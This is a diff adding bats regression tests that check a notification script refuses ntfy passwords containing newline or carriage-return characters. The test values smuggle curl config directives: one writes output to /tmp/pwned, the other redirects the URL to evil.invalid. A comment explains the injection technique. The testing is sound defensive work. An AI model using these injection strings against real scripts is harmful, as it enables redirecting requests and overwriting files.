@@ -301,3 +301,26 @@ EOF
   command grep -q 'ha\\"s' "${_RHN_NTFY_STDIN}"
   command grep -q 'p\\\\w'  "${_RHN_NTFY_STDIN}"
 }
+
+@test "a newline in the credential is refused, not escaped" {
+  # curl's config format is line-oriented: a quoted value cannot contain a line
+  # break, so everything after one is parsed as further DIRECTIVES. Measured on
+  # curl 8.7.1 -- a password of $'p\noutput = /tmp/x' made curl obey the smuggled
+  # `output` and write the response body there; user-agent/url/upload-file are
+  # reachable identically. Escaping cannot close this; refusal can.
+  export NTFY_USER="u" NTFY_PASSWORD=$'p\noutput = /tmp/pwned' NTFY_TOPIC="t"
+  _detector 1 'x#1  1d  major  y'
+  run bash "${SCRIPT}" "${NAME}" "${_RHN_DETECTOR}"
+  [ "$status" -eq 1 ]
+  [[ "$output" == *"newline"* ]]
+  run ! command grep -q 'output = ' "${_RHN_NTFY_STDIN}"
+  run ! command grep -q 'output = ' "${_RHN_NTFY_LOG}"
+}
+
+@test "a carriage return is refused too" {
+  export NTFY_USER="u" NTFY_PASSWORD=$'p\rurl = https://evil.invalid' NTFY_TOPIC="t"
+  _detector 1 'x#1  1d  major  y'
+  run bash "${SCRIPT}" "${NAME}" "${_RHN_DETECTOR}"
+  [[ "$output" == *"newline"* ]]
+  run ! command grep -q 'evil.invalid' "${_RHN_NTFY_STDIN}"
+}
